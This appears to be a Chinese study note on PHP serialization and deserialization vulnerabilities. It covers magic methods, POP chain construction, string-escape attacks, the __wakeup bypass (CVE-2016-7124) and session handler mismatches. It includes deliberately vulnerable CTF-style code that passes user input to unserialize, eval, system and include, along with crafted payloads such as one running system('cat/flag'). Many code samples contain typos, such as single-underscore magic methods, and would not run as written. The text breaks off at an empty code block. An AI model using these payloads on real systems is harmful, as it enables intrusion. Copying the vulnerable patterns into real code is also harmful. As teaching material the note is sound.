## 1 前置知识

### 1.1 php面向对象基础知识

#### 1.1.1 面向对象

**程序开发：面向过程VS面向对象**

形象点举个例子：

【在家我要吃西红柿炒鸡蛋，我要想好先做什么，再做什么。我要解决的问题是我要吃西红柿炒鸡蛋，我把它按步骤分开来解决。】这是**面向过程**

【我去餐馆点西红柿炒鸡蛋，和上面同样的问题，但此时我考虑的就不是怎么做，按什么步骤做，我此时要考虑的是西红柿炒鸡蛋这个整体，对象是一个提前就封装好的东西。】这是**面向对象**



**面向过程：**面向过程是一种以“整体事件”为中心的编程思想，编程的时候把 解决问题的步骤分析出来，然后用过函数把这些步骤是心啊，再一步步的具体步骤中再按顺序调用函数



**面向对象**：面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个对象

对象是一个信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象



==对象的三个 特征：对象的行为，对象的形态，对象的表示==



#### 1.1.2 类的定义

**类**是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。

对象是具有类类型的变量，是对类的实例



例如：我要买水果，我就和老板讲，“老板，我要点水果”，老板问，“什么水果”，我说，“我就要水果”。

另一个人进来了，“老板，来点苹果”，老板说，“好嘞”。

**水果是“类”，而苹果是“对象”**。苹果是具有水果这个类类型的变量，是水果这个类的实例


#### 1.1.3 类的构成

**成员变量（属性）+成员函数（方法）**

**成员变量（属性）：** 定义在类内部的变量

**成员函数（方法）：** 定义在类的内部，可用于访问对象的数据

#### 1.1.4 继承

继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系

在定义和实现一个累的时候，可以在一个已经存在的类的基础之上来进行,把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容

**父类：** 一个类被其它类继承，可将该类成为父类，或基类，超类

**子类：** 一个类看i成其他类称为子类，也可称为派生类



#### 1.1.5 类与对象

**类的结构**

```php
class class_Name{
    //成员变量 声明
    //成员函数 声明
}
```

**类的内容**

创建一个类

```php
class hero{  //"hero"类的名称
    var $name;
    var $sex;   //声明成员变量，var是一种修饰符
    function jinenng($var1){  //函数（方法）的名称叫jineng，传参$var1
       echo $this->name;   //在当前类里面去调用当前类里的内容时要用$this->
       echo '释放了技能:'.$var1;
    }
}
```

 **实例化和赋值**

就拿上面的来说

```php
$musy = new hero();
$musy->name = '沐矢羽';
$musy->sex = '男';

print_r($musy);
/*
hero Object{
[name]=>沐矢羽
[sex]=>男
} 
*/
```

调用方法

```php
$musy->jineng(var1:'飞行');
//沐矢羽释放了技能：飞行
```

#### 1.1.6 类的修饰符

在类中直接声明的变量称为成员属性（也可以称为成员变量）

可以在类中声明多个变量，即”对象“中可以有多个成员属性，每个变量都存储”对象“不同的属性信息

访问权限修饰符：对属性的定义

**常用访问权限修饰符：**

==public==：公共的，在类的内部，子类中 或者类的外部都可以使用，不受限制；

==protected==：受保护的，在类的内部、子类中可以使用，但不能在类的外部使用；

==private==：私有的，只能在类的内部使用，在类的外部或者子类中都无法使用；

```php
class hero{
    public $name='mushiyu';
    private $sex=-'man';
    protected $shengao='165';
    function jineng($var1){
        echo $this->name;
        echo $var1;
    }
}
$musy=new hero();
echo $musy->name; //外部可用
echo $musy->sex;  //外部不可用
echo $musy->shengao;  //外部不可用
```

添加一个子类

```php
class hero{
    public $name='mushiyu';
    private $sex=-'man';
    protected $shengao='165';
    function jineng($var1){
        echo $this->name;
        echo $var1;
    }
}
class hero2 extends hero{
    function test($name){
        echo $this->name; //子类可以用
        echo $this->sex;  //子类不可用
        echo $this->shengao;  //子类可用
    }
}

$musy=new hero();
$nu=new hero();


$musy2=new hero2();

echo $musy->name;

$musy2->test();
```

#### 1.1.7 类的成员方法

在类中定义的函数被称为成员方法

**函数**实现的是某个独立的功能；

**成员方法**：实现的是类中的一个行为，是类的一部分



可以在类中声明多个成员方法，成员方法的声明和函数声明完全一样，在声明成员方法是可以在function前加一些访问权限修饰符，可以省略，默认public



### 1.2 序列化基础知识

#### 1.2.1 序列化的作用

**序列化（Serialization)** 是将对象的状态信息（属性）转换为可以存储或传输的过程。![34fc08261d8f65602e2dbbd4195ad73](34fc08261d8f65602e2dbbd4195ad73.png)



#### 1.2.2 序列化之后的表达方式/格式

```php
<?php
$a = null;
echo serialize($a);
?>
```

|     数据类型     |   示例    |        序列化后         |
| :----------: | :-----: | :-----------------: |
|     空字符      |  null   |         N;          |
|      整形      |   111   |       i:111;        |
|     浮点型      |  11.1   |       d:11.1;       |
| Boolean.ture |  ture   |        b:1;         |
| Bolean.false |  false  |        b:0;         |
|     字符串      | ”mu"sy“ | s:5(字符串长度):"mu"sy"; |
|              |         |                     |
|              |         |                     |

 **数组**

```php
<?php
$a=array("musy","dhx","zjt");
echo $a[0]; //musy
echo serialize($a);

*****************************************
    
a:3:{i:0;s:4:"musy";i:1;s:3:"dhx";i:2;s:3:"zjt";} 


a 是数组，3是三个内容，i:0;是序号，s:4:"musy";是字符串
```



#### 1.2.3 对象序列化详解

==**只序列化成员属性，不序列化成员方法**==

------

**public属性序列化**

```php
<?php
class member{
    public $name='musy'；
    public $area='WEB';
    function lingyu(){
        echo $this->area;
    }
}
$musy = new member();
echo serilize($musy);
?>
    
*****************************************

O:6:"member":2:{s:4:"name";s:4:"musy";s:4:"area";s:3:"WEB";}
```

o:object    6：类的名称长度(member的长度)

"member"：类名      2：成员属性的数量

s:4:"name" 属性名的序列化

s:4:"musy" 属性值的序列化



------



**private属性序列化**

把上面的代码做个改动

```php
<?php
class member{
    private $name='musy'；
    public $area='WEB';
    function lingyu(){
        echo $this->area;
    }
}
$musy = new member();
echo serilize($musy);
?>
    
*****************************************
    
O:6:"member":2:{s:12:"membername";s:4:"musy";s:4:"area";s:3:"WEB";}
```

s:12:"membername";

private属性在序列化时，会在原本的变量名前加上类名，此外，还会在类名前后加一个空，但是我们看不到

它实际上是`%00member%00name`

%00是空的url编码形式



------



**protected属性序列化**

```php
private $name='musy'；
    
*****************************************
 
s:7:"*name";
```

protected属性在序列化时会在原本的变量名前加上一个`*`，在`*`前后有一个空

实际上是`%00*%00name`



------



**还有一种特殊的情况**

```php
<?php
class test{
    var $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
class test2{
    var $ben;
    function _construct(){
        $this->ben=new test();
        //把test实例成一个对象，并把这个对象的值赋给了$ben
    }
}
$a=new test2();
echo serialize($a);
?>

对象$a在实例化类'test2'时调用另一个类'test'实例化后的对象
    
*****************************************

O:5:"test2":1:{s:3:"ben";O:4:"test":1:{s:3:"pub";s:6:"benben";}}
```



### 1.3 反序列化

**1.反序列化后的内容为一个对象；**

**2.反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关；**

**3.反序列化不触发类的成员方法；需要调用方法后才能触发**

------



#### 1.3.1 反序列化的作用 

将序列化后的参数还原成实例化的对象



**实例演示**

```php
<?php
class test{
    public $a='musy';
    protected $b=27;
    private $c=false;
    public function displayVar(){
        echo $this->a;
    }
}
$d=new test();
$d=serilize($d);
$a=urlencode($d);//变成url编码形式
$b=unserilize(urldecode($a));//url解码，并且反序列化
var_dump($b);//打印反序列化后的内容
    
?>
    
*****************************************
    
object(test)#1 (3){
    ["a"]=>
    string(4) "musy"
    ["b":protected]=>
    int(27)
    ["c":"test":pribate]=>
    bool(false)
}
```

## 2 反序列化漏洞



### 2.1 漏洞成因

反序列化过程中，unserialize( )接受的值（字符串）可控；通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值。



### 2.2 利用漏洞

通过调用方法，触发代码执行

## 3 魔术方法

### 3.1 基础知识

#### 3.1.1 概念

一个定义好的，在特定情况下自动触发的行为方法

<u>例如，在洗澡这个特定情况下，触发脱衣服这个方法</u>

#### 3.1.2 作用

魔术方法在特定条件下自动调用相关方法，最终导致触发**代码**



#### 3.1.3 相关机制

**触发时机，功能，参数（一些特殊的魔术方法会传参），返回值**



### 3.2 常用魔术方法

#### 3.2.1 构造和析构

**==_construct()==**

构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法

------

**触发时机**：实例化对象

**功能**：提前清理不必要内容

**参数**：非必要

**返回值**：

------



```php
<?php
class User{
    public $username;
    public function_construct($username){
        $this->username=$username;
        echo "触发了构造函数1次";
    }
}
$test = new User("musy");
$ser=serialize($test);
unserialze($ser);
?>
    
*****************************************
    
触发了构造函数1次

只在实例化对象时触发，序列化和反序列化过程中不会触发
```



**==_destruct()==**

析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法

------

**触发时机**：对象引用完成，或对象被销毁

**功能**：

**参数**：

**返回值**：

------



```php
<?php
class User{
    public $username;
    public function_destruct($username){
       echo "触发了构造函数1次";
    }
}
$test = new User("musy"); 1
$ser=serialize($test);  2
unserialze($ser);  3
?>
    
*****************************************
    
触发了析构函数1次
触发了析构函数1次

1.实例化一个对象时没有触发，是实例化了一个对象，且这个对象，这行代码中用完了，才触发
2.serialize()不会触发
3. unserializa()反序列化得到的是对象，用完后会销毁，触发一次
```

**例题**

```php
<?php
class User{
    var $cmd="system('ls');";
    public function _destruct(){
        eval($this->cmd);
    }
}
$ser = $GET['benben'];
unserialize($ser);
?>
```

unserialize()触发_desruct()

destruct执行eval()

eval()触发代码

```php
?benben=O:4:"User":1:{s:3:"cmd";s:13:"system('cat/flag');";}
```



#### 3.2.2 wakeup和sleep

**==_sleep( )==**

序列化serialize()函数会检查类中是否存在一个魔术方法_sleep()。

如果存在，该方法会先被调用，然后才执行序列化操作。

此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。

如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误



------

**触发时机**：==序列化serialize()之前==

**功能**：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性

**参数**：成员属性 return array()

**返回值**：需要被序列化存储的成员属性

------

**实例**

```php
<?php
    class User{
    const SITE='musy';
    public $username;
    public $nickname;
    private $password;
    public function _construct($username,$nickname,$password){
        $this->username=$username;
        $this->nickname=$nickname;
        $this->password= $password;
}
    public function _sleep(){
        return array('username','nickname');
    }
}
$user = new User('a','b','c');//a,b,c被分别赋值给三个属性
echo serialize($user);
?>
    
*******************************************************
    
最后输出的只有username 和 nickname 的序列化字符串
```

_construct 在new的时候被触发

_sleep在序列化之前触发，返回需要序列化的变量名，过滤掉了password

**例题**

```php
<?php
class User{
    coust SITE='musy';
    public $username;
    public $nickname;
    private $password;
    public function _construct($username,$nickname,$password){
        $this->username=$username;
        $this->nickname=$nickname;
        $this->password=$password;
    }
    public function _sleep(){
        system($this->username);
    }
}
$cmd = $_GET['benben'];
$user = new User('$cmd','b','c');
echo serialize($user);
?>
```

GET传参，benben的值赋给cmd，cmd赋给username

序列化触发sleep，先执行sleep

```php
?benben='cat/flag'
```



**==_wakeup()==**

unserialize()会检查是否存在一个_wakeup()方法

**如果存在，则会先调用_wakeup()方法，预先准备对象需要的资源。**

预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。



------

**触发时机**：==反序列化unserialize()之前==

**功能**：

**参数**：

**返回值**：

------

**ps：**_wakeup()是在反序列化之==前==

​        _destruct()是在反序列化之==后==

------

**例题**

```php
<?php
class User{
    const SITE='musy';
    public $username;
    public $nickname;
    private $password;
    private $order;
    public function _wakeup(){
        system($this->username);
    }
}
$user_ser=$GET_['benben'];
unserialiaze($user_ser);
?>
```

```php
?benben=O:4:"User":1:{s:8:"username";s:8:"cat/flag";}
```



#### 3.2.3 tostring和invoke

**==_tostring( )==**

表达方式错误导致魔术方法触发

------

**触发时机**：把对象当成字符串调用

**功能：**

**参数：**

**返回值：**

------

**实例**

```php
<?php
class User{
    var $name='沐矢羽';
    public function_tostring(){
        return '格式不对，输出不了！'；
    }
}
$test=new User();
print_r($test);

echo $test;
?>
    
***************************************
    
print_r 可以正常输出
echo 不可以正常输出，把对象当成字符串调用，触发tostring
```



**==_invoke( )==**

格式表达错误导致魔术方法触发

------

**触发时机：** 把对象当成函数调用

**功能**：

**参数**：

**返回值**：

------

**实例**

```php
<?php
    class User{
    var name='沐矢羽';
    public function_invoke(){
        echo '它不是个函数';
    }
}
$test = new User();
echo $test->name;

$test();

?>

***************************************
    
第一个可以正常输出
第二个错把对象当成函数使用，触发invoke
```



#### 3.2.4 错误调用相关魔术方法

![e4a330a05923aab1c7e9db5157cf823](e4a330a05923aab1c7e9db5157cf823.png)

##### **==_call( )==**

调用的成员方法callxxxxx（）不存在，触发魔术方法call（）

------

**触发时机**：调用一个不存在的方法

**功能**：

**参数**：两个参数传参$arg1,$arg2

**返回值**：调用的不存在的方法的名称和参数

------

**实例**

```php
<?php
class User{
    public function _call($arg1,$arg2){
        echo "$arg1,$arg2[0]";
    }
}
$test =new User();
$test->callss('a');//没有这个方法，触发_call
?>
    
***************************************
    
callss,a
```



##### **==_callStatic( )==**

------

触发时机：静态调用或调用成员常量时使用的方法不存在

功能：

参数：两个参数传参$arg1,$arg2

返回值：调用的不存在的方法的名称和参数

------

**实例**

```php
<?php
class User{
    public function _call($arg1,$arg2){
        echo "$arg1,$arg2[0]";
    }
}
$test=new User();
$test::callxxx('a');
?>
    
***************************************
    
callxxx,a
```



##### **==_get( )==**

------

触发时机：调用的成员属性不存在

功能：

参数：传参$arg1

返回值：不存在的成员属性的名称

**实例**

```php
<php?
class User{
    public $var1
        public function _get(arg1){
        echo $arg1;
    }
}
$test=new User();
$test->var2;//var2不存在，触发get
?>
```



##### **==_set( )==**

------

触发时机：给不存在的成员属性赋值

功能：

参数：传参$arg1,$arg2

返回值：不存在的成员属性的名称和赋的值

------

 

##### **==_isset( )==**

------

触发时机：对不可访问属性使用isset（）或empty（）时，issset（）会被调用

功能：

参数：传参$arg

返回值：不存在的成员属性的名称

**实例**

```php
<?php
    class User{
    prvivate $var
        public function _isset($arg1){
        echo $arg1;
    }
}
$test = new User();
isset($test->var);
?>

***************************************
    
var 是私有的，或者当var不存在在时，触发isset
```



##### **==_unset( )==**

和isset区别不大



##### **==_clone( )==**

------

触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法clone

功能：

参数：

返回值：

------

**实例**

```php
<?php
class User{
    private $var
        public function _clone(){
        echo "_clone test";
          
    }
}
$test = new User();
$newtest = clone($test);//这个拷贝结束后会触发clone
?>
```



## 4 POP链的构造思路知识

### 4.1 POP链

在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫"面向属性编程",即POP(property Oriented Programming).

POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload.

<u>简单点说，就是蝴蝶效应，a触发b，b又触发c........</u>

### 4.2 POC 编写

POC(全称：Proof of concept)，中文译作概念验证。在安全界可以理解成漏洞验证程序。POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码

编写一段不完整的程序，获取所需的序列化字符串

### 4.3 例题

```php
<?php 
//flag is in flag.php
highlight_file(_FILE_);
error_reporting(0);
    class Modifier
{
    private $var;
    public function append($value){
        include($value);
        echo $flag;
    }
    public function _invoke(){
        $this->append($this->var);
    }
}


    class Show
{
    public $source;
    public $str;
    public function _toString(){
        return $this->str->source;
    }
    public function _wakeup(){
        echo $this->source;
    }
}


    class Test
{
    public $p;
    public function _construct(){
        $this->p=array();
    }
    public function _get($key){
        $function=$this->p;
        return $function();
    }
}



    if(isset($GET['pop'])){
        unserilize($_GET['pop'];)
    }
?>
```

1.目标：触发echo，输出$flag

2.触发invoke,调用append，并使$var=flag.php

3.invoke触发条件：把对象当成函数

4.给$p赋值为对象即function成为对象Modifier，却被当成函数调用，触发Modifier中的invoke

5.触发get，触发条件：调用不存在的成员属性

6.给$str赋值为对象Test，而Test中不存在成员属性source，则触发Test里的成员方法get

7.触发tostring，触发条件：把对象当成字符串

8.把$source变成对象Show，当成字符串被echo调用，触发tostring

9.触发wakeup,反序列化



整个链条这样看9->8->7->6->5->4->3->2->1，就相当清晰了 



**开始构造**

```php
<?php 
    class Modifier
{
    private $var = 'flag.php';
}
    class Show
{
    public $source;
    public $str;
}
    class Test
{
    public $p;
}
$mod = new Modifier();
$test = new Test();
$test->p = $mod;
$show = new Show();
$show->str = $test;
$show->source = $show;
echo serialize($show);
?>
```

得到序列化字符串后，要在私有属性的名称的类名前后加%00

```php
O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:13:"%00Modifier%00var";s:8:"flag.php";}}}
```

进行传参，拿到flag

```php
flag{1236589713164nfcono44sdvcsdv6544vb98};
```


## 5 PHP反序列化逃逸漏洞

### 5.1 反序列化基本规则

PHP反序列化过程严格遵守特定的格式规则，理解这些规则是掌握反序列化逃逸漏洞的基础。

#### 5.1.1 结构完整性要求

反序列化字符串必须满足以下结构要求才能被正确解析：

- **对象结构完整性**：`O:类名长度:"类名":属性数量:{属性定义}`
    
- **属性结构完整性**：每个属性定义为`属性类型:属性名长度:"属性名";值类型:值长度:"值"`
    
- **数量一致性**：声明的属性数量必须与实际提供的属性数量完全一致
    

```php
<?php
class A{
    public $v1 = "a";
}
// 正确：声明的1个属性与实际提供的1个属性匹配
$b = 'O:1:"A":1:{s:2:"v1";s:1:"a";}';
var_dump(unserialize($b)); // 成功

// 错误：声明的1个属性与实际提供的2个属性不匹配
$b = 'O:1:"A":1:{s:2:"v1";s:1:"a";s:2:"v2";N;}';
var_dump(unserialize($b)); // bool(false)

// 正确：声明的2个属性与实际提供的2个属性匹配
$b = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";N;}';
var_dump(unserialize($b)); // 成功
```

#### 5.1.2 长度字段一致性

每个字符串值的**实际长度必须与长度声明完全一致**，否则会导致反序列化失败。

```php
<?php
// 错误：实际值"musy"长度为4，但声明长度为1
$b = 'O:1:"A":2:{s:2:"v1";s:1:"musy";s:2:"v2";N;}';
var_dump(unserialize($b)); // bool(false)

// 正确：声明长度与实际长度一致
$b = 'O:1:"A":2:{s:2:"v1";s:4:"musy";s:2:"v2";N;}';
var_dump(unserialize($b)); // 成功
```

#### 5.1.3 反序列化终止符

PHP反序列化过程以`;}`作为终止符。**只要前面的序列化字符串格式正确，后面的内容不会影响反序列化结果**。

#### 5.1.4 特殊字符处理

当属性值包含引号等特殊字符时，序列化会自动进行转义，此时**字符串长度包括实际字符数，而不是转义后的字符数**。

```php
<?php
class A{
    public $v1 = "a\"b"; // 包含引号的字符串
}
echo serialize(new A());
// 输出：O:1:"A":1:{s:2:"v1";s:3:"a"b";}
// 实际值为a"b（3个字符），而非a\"b（4个字符）
```

### 5.2 反序列化属性处理机制

#### 5.2.1 属性来源规则

当反序列化一个对象时：

- 反序列化字符串中明确定义的属性，其值由字符串提供
    
- 反序列化字符串中未定义但类中存在的属性，其值使用类定义中的默认值
    
- 反序列化字符串中定义但类中不存在的属性，该属性会被动态添加到对象中
    

```php
<?php
class Musy{
    public $v1 = 'a';
    public $v2 = 'b'; // 类中定义的默认值
}

$b = 'O:4:"Musy":2:{s:2:"v1";s:1:"a";s:2:"v3";s:1:"c";}';
$c = unserialize($b);
var_dump($c);

/* 输出：
object(Musy)#1 (3) {
  ["v1"]=> string(1) "a"  // 来自反序列化字符串
  ["v2"]=> string(1) "b"  // 来自类定义（默认值）
  ["v3"]=> string(1) "c"  // 来自反序列化字符串（动态添加）
}
*/
```

### 5.3 反序列化逃逸漏洞产生场景

反序列化属性逃逸通常发生在以下特定场景：

####  5.3.1 漏洞产生条件

1. **数据处理链条**：数据先经过`serialize()`序列化，然后进行字符串处理（如过滤、替换），最后进行`unserialize()`反序列化
    
2. **字符串长度变化**：在序列化和反序列化之间，字符串处理操作导致序列化字符串长度发生变化（变多或变少）
    
3. **长度字段不变**：字符串实际内容变化，但序列化字符串中的长度声明保持不变
    

#### 5.3.2 关键漏洞原理

PHP反序列化时，**完全依赖长度声明来确定每个值的边界**，而不是通过特殊分隔符。当实际字符串内容发生变化而长度声明未相应更新时，会产生边界解析错误，攻击者可以利用这种错误注入恶意属性。
![[Pasted image 20260121190222.png]]

#### 5.3.3 两种逃逸类型

1. **字符减少逃逸**：过滤操作使字符串变短，吞噬后续有效代码
    
2. **字符增多逃逸**：替换操作使字符串变长，吐出多余字符可被构造为恶意代码
    

下面用表格总结这两种逃逸类型的核心区别：

|特征|字符减少逃逸|字符增多逃逸|
|---|---|---|
|**触发条件**​|敏感字符被替换为空或更短字符|短字符被替换为更长字符|
|**长度变化**​|实际字符串变短|实际字符串变长|
|**攻击方式**​|吞噬后续合法属性，注入恶意属性|吐出多余字符，构造恶意属性|
|**关键利用**​|通过精确计算需要吞噬的字符数|通过精确计算需要吐出的字符数|

这些前置知识是理解后续反序列化逃逸攻击技术的基础，重点在于理解PHP反序列化机制对长度字段的依赖性和严格的结构要求，这种严格性与实际字符串处理后的不匹配正是漏洞产生的根源。


### 5.4 字符串逃逸_字符减少

#### 5.4.1 基础

**实例**

```php
<?php
    class A{
    public $v1 = "abcsystem()";
    public $v2 = "123";
}
$data = serialize(new A());
```

```php
O:1:"A":2:{s:2:"v1";s:11:"abcsystem()";s:2:"v2";s:3:"123";}
```

```php
$data = str_replace("system()","",$data);
echo $data;
var_dump(unserialize($data));
?>
```

O:1:"A":2:{s:2:"v1";s:==11==:"**==abc";s:2:"v==** 2";s:3:"123";},反序列化不成功，11对应的发生了改变，且整个序列化字符串结构错误
8
str_replace把"system()"替换为"空"

![08172f46ff26e76a55754625500312d](08172f46ff26e76a55754625500312d.png)



**反序列化字符串减少逃逸**：**多逃逸出一个成员属性**，**第一个字符串减少，吃掉有效代码，在第二个字符串构造代码**



#### 5.4.2 例题

**思路**

**1.字符串过滤后减少还是增多**

**2.构造出关键成员属性序列化字符串**

**3.变少则判断吃掉的内容，并计算长度**

**4.构造payload并提交**

```php
<?php
function fiter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip=false;
    function_construct($user,$pass){
        $this->user=$user;
        $this->pass=$pass;
    }
}
$param=$_GET['user'];
$pass=$_GET['pass'];
$param=serialize(new test($param,$pass));
$profile=unserialize(filter($param))

if($profile->vip){
    echo file_get_contents("flag.php");
}
?>
```

1.最终目的：判断vip值为真

对$param值'user'进行安全性检查，filter把"flag","php"替换为"hk",然后再反序列化，判断vip值是否为真

2.先构造一个

```php
<?php
    class test{
    var $user = "flag";
    var $pass = "benben";
    var $vip = ture;
}
echo serialize(new test());
?>
```

```php
O:4:"test":3:{s:4:"user";s:4:"flag";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}
```

想让==s:3:"vip";b:1;}==有效可以通过更改user的值来控制吃掉多少代码，可以选择吃掉==";s:4:"pass";s:6:"==这部分代码，一共19位，一个flag变成hk吃掉两个，共需要吃十次，多吃1位补1位

**最终构造**

user=flagflagflagflagflagflagflagflagflagflag

pass=1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}

```php
O:4:"test":3:{s:4:"user";s:40:"flagflagflagflagflagflagflagflagflagflag";s:4:"pass";s:42:"1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}";s:3:"vip";b:0;}
```

### 5.5 字符串逃逸_字符增多

#### 5.5.1 基础

**反序列化字符串增多逃逸：构造出一个逃逸成员属性，第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性**



**实例**

```php
<?php
    class A{
    public $v1 = 'ls';
    public $v2 = '123';
}
$data = serialize(new A());
echo $data;

O:1:"A":2:{s:2:"v1";s:2:"ls";s:2:"v2";s:3:"123";}

$data = str_replace("ls","pwd",$data);
echo $data;

var_dump(unserialize($data));
?>
```

str_replace把"ls"替换为"pwd"；无法正常反序列化

字符串变成了

O:1:"A":2:{s:2:"v1";s:==2==:"==pw==**d**";s:2:"v2";s:3:"123";}

字符串内容改变了，但长度没变，d被吐出来了，d从字符串，变成了功能型代码，可以对**d**这部分进行构造，来实现逃逸

![91854bcb34ecbfde47e4c89cd367e71](91854bcb34ecbfde47e4c89cd367e71.png)



#### 5.5.2 例题

**思路**

**1.字符串过滤后减少还是增多**

**2.构造出关键属性序列化字符串**

**3.增多则判断一次吐出来多少个字符**

**4.构造payload并提交**

```php
<?php
    function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);
    return $name;
}
    class test{
        var $user;
        var $pass='daydream';
        function_construct($user){
            $this->user=$user;
        }
    }
$param=$_GET['param'];
$param=serialize(new test($param));
$profile=unserialize(filter($param));

if($profiile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
```

1.目标：判断是否pass=='escaping'

2.`$_GET['param']`获取值给`$param`并放在实例化test里作为一个参数，实例化触发construct赋值给$user对$param值进行安全性检查，fillter把"flag","php"替换为"hack"，然后再反序列化，把有效代码往外吐

先给$pass赋要求的值，得到序列化字符串

```php
<?php
    class test{
    var $user；
    var $pass = 'escaping';
}

echo serialize(new test());
?>
```

```php
O:4:"test":2:{s:4:"user";N;s:4:"pass";s:8:"escaping";}
```

$user 的值可控，目标逃逸代码s:4:"pass";s:8:"escaping";}

长度是27，php被替换成hack，字符串增多，会突出字符串变成结构代码，一个php吐出一个字符，再补全 ==";== 需要吐出29个字符

所以要给$user赋值为29个php再加上";s:4:"pass";s:8:"escaping";}

即要**构造**

```php
<?php
class test{
        var $user='phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}';
        var $pass='daydream';
}

echo serialize(new test());
?>
```

## 6 wakeup 绕过

反序列化漏洞：CVE-2016-7124

php5<5.6.25

php7<7.0.10

漏洞产生原因：

如果存在_wakeup方法，调用unserialize()方法前则先调用wakeup()方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过wakeup()的执行

会触发wakeup

```php
O:4:"test":2:{s:1:"a";s:7:"mushiyu";s:1:"b";i:18;}
```

不会触发wakeup

```php
O:4:"test":3:{s:1:"a";s:7:"mushiyu";s:1:"b";i:18;}
```


#### 例题

```php
<?php
class secret
{
    var $file='index.php';
    public function_construct($file){
    $this->file=$file;
    }
    function_destruct(){
    include_once($this->file);
    echo $flag;
    }
    function_wakeup(){
    $this->file='index.php';
    }
}
$cmd=$_GET['cmd'];
if(!isset($cmd)){
    highlight_file(_FILE_);
}
else{
    if(preg_match('/[oc]:\d+:/i',$cmd)){
        echo "Are you daydreaming?";
    }
    else{
        unserialize($cmd);
    }
}
//secrect in flag.php
?>
```

如果$cmd为空，显示源代码，如果不为空，进行正则表达，O：后面不能出现数字

目标：反序列化后，触发_destruct()，把file定义成flag.php输出

那么就跟据已知条件进行构造

```php
O:+6:"secret":2:{s:4"file";s:8:"flag.php";}
```

最后要进行urlencode(  )编码，可以避免一些问题

### 漏洞利用的深层原理

简单来说，你可以将PHP的反序列化过程理解为一个**有步骤的解析器**：

1. **开始解析**：解析器读取序列化字符串，识别出类名和声明的属性数量。
    
2. **处理属性**：然后，它开始按照字符串中的描述，一个接一个地设置对象的属性值。
    
3. **发现异常**：当解析器尝试读取第N个属性时，却发现字符串提前结束或格式不符（因为实际属性不足N个）。
    
4. **中断与响应**：此时，解析器会判定整个反序列化过程失败。**然而，关键点在于**：
    
    - 在失败之前，已经成功解析的那些属性（例如前两个）**已经被设置到了新创建的对象上**。
        
    - 虽然失败导致对象创建不完整，但PHP仍然会识别出这个对象实例，并在脚本结束时或特定情况下调用其 **`__destruct()`**​ 析构方法。
        
    

而 **`__wakeup()`**​ 方法被设计为在反序列化**开始时**、所有属性被设置**之前**调用。由于属性数量不符导致解析器在设置属性阶段就“报错退出”，`__wakeup()`的调用逻辑便被跳过了。

## 7 引用

引用的利用方式

引用类似于指针

**例题**

```php
<?php
    include("flag.php");
class just4fun{
    var $enter;
    var $secret;
}
if(isset($_GET['pass'])){
    $pass=$_GET['pass'];
    $pass=str_replace('*','\*',$pass);
}
$o=unserialize($pass);
if($o){
    $o->secret="*";
    if($o->secret===$o->enter)
        echo "Congratulation!Here is my secret:".$flag;
    else
        echo "Oh no... you can't fool me";
}
else echo "are you troling?";
?>
```

`$o`为反序列化$pass后的对象，且赋值secret="*"

最终目的：secret === enter

思路 ：通过构造`$pass`的值pass使$enter=*

障碍：$pass在获取pass后，str_replace把*替换掉

于是，就要思考怎样在不输入*****的情况下，让$enter值变为*****

**这样进行构造**

```php
<?php
    class $enter{
    var $enter;
    var $secet;
}

$a=new just4fun();
$a->enter=&a->secret;//这里就是引用
echo serialize($a);
?>
```

## 8 session反序列化漏洞

### 8.1 session

当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用绘画管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。

**存取数据的格式有多种，常用的有三种**

**漏洞产生：写入格式和读取格式不一致**

|           处理方式            | 对应的存储格式                                    |
| :-----------------------: | ------------------------------------------ |
|            php            | 键名+竖线+经过serialize()函数序列化处理的值               |
| php_serialize(php>=5.5.4) | 经过serialize()函数序列化处理的数组                    |
|        php_binary         | 键名的长度对应的ascii字符+键名+经过serialize()函数反序列化处理的值 |
|                           |                                            |



**默认情况下用php格式储存**

```php
<?php
session_start();
$_SSESION['benben']=$_GET['ben'];
?>
```

?ben=musy

benben | s:4:"musy";



**php_serialize**

```php
<?php
ini_set('session.serialize_handler','php_serialize');//声明使用这种格式来存储
session_start();
$_SESSION['benben']=$_GET['ben'];
$_SESSION['b']=$_GET['b'];
?>
```

?ben=dazhuang&b=666

a:2:{s:6:"benben";s:8:"dazhuang";s:1:"b";s:3:"666";}



**php_binary**

```php
<?php
ini_set('session.serialize_hander','php_binary');
session_start();
$_SESSION['benben']=$_get['ben'];
$_SESSION['b']=$_GET['b'];
?>
```

?ben=dazhuang&b=666

ACKbenbens:8:"dazhuang";SOHbs:3:"666";



### 8.2 例题

![[Pasted image 20260122091424.png]]

```php
<?php
